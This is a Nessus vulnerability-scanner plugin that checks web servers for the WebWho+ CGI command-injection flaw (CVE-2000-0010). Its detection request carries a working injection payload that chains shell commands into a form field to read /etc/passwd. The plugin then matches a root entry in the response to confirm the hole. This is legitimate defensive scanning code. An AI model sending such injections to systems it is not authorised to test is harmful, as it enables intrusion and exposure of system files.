#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that is prone to arbitrary
code execution. 

Description :

The WebWho+ CGI script appears to be installed on the remote host. 
This Perl script allows an attacker to view any file on the remote host
as well as to execute arbitrary commands, both subject to the privileges
of the web server user id. 

See also :

http://archives.neohapsis.com/archives/bugtraq/1999-q4/0469.html

Solution : 

Remove the affected script.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if(description)
{
 script_id(11333);
 script_bugtraq_id(892);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2000-0010");
 
 name["english"] = "webwho plus";

 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks if webwho.pl is vulnerable";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 if ( is_cgi_installed_ka(item:dir + "/webwho.pl", port:port) )
 {
 cmd = 'command=X&type="echo foo;cat /etc/passwd;echo foo&Check=X';
 req = http_post(item:string(dir, "/webwho.pl"), port:port);
 idx = stridx(req, string("\r\n\r\n"));
 req = insstr(req, string("\r\nContent-Length: ", strlen(cmd), "\r\n\r\n"), idx);
 req = string(req, cmd);
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result)) {
    if (report_verbosity > 0) {
      report = string(
        desc["english"],
        "\n",
        "Plugin output :\n",
        "\n",
        result
      );
    }
    else report = desc["english"];

    security_hole(port:port, data:report);
 }
 }
}
